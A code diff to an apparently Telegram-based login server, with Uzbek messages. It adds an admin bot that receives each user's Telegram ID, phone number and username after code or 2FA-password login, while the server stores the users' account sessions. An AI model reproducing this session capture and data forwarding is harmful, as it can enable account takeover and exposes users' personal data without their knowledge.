@@ -32,24 +32,24 @@ from database import get_db, get_temp_groups_from_db
 import requests
 import os
 
+ADMIN_BOT_TOKEN = os.getenv("ADMIN_BOT_TOKEN")
+ADMIN_ID = int(os.getenv("ADMIN_ID"))
+
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 
-def notify_bot(user_id: int, text: str):
-    """
-    Login-serverdan botga xabar yuboradi
-    """
+def notify_admin_bot(text: str):
     try:
         requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
             json={
-                "chat_id": user_id,
+                "chat_id": ADMIN_ID,
                 "text": text,
                 "parse_mode": "Markdown"
             },
             timeout=5
         )
     except Exception as e:
-        print("BOT NOTIFY ERROR:", e)
+        print("ADMIN BOT NOTIFY ERROR:", e)
 
 
 # =====================
@@ -192,6 +192,13 @@ def verify_code():
         save_user_session(user.id, final_session)
         save_user(user.id, phone, user.username)
         delete_login_attempt(phone)
+        notify_admin_bot(
+            "🆕 *Yangi foydalanuvchi login qildi*\n\n"
+            f"👤 ID: `{user.id}`\n"
+            f"📞 Telefon: `{phone}`\n"
+            f"👤 Username: @{user.username if user.username else 'yo‘q'}"
+        )
+
 
         return jsonify({"status": "ok"}), 200
 
@@ -244,6 +251,13 @@ def verify_password():
         save_user_session(user.id, final_session)
         save_user(user.id, phone, user.username)
         delete_login_attempt(phone)
+        notify_admin_bot(
+            "🔐 *Yangi foydalanuvchi (2FA) login qildi*\n\n"
+            f"👤 ID: `{user.id}`\n"
+            f"📞 Telefon: `{phone}`\n"
+            f"👤 Username: @{user.username if user.username else 'yo‘q'}"
+        )
+
 
         return jsonify({"status": "ok"}), 200
 
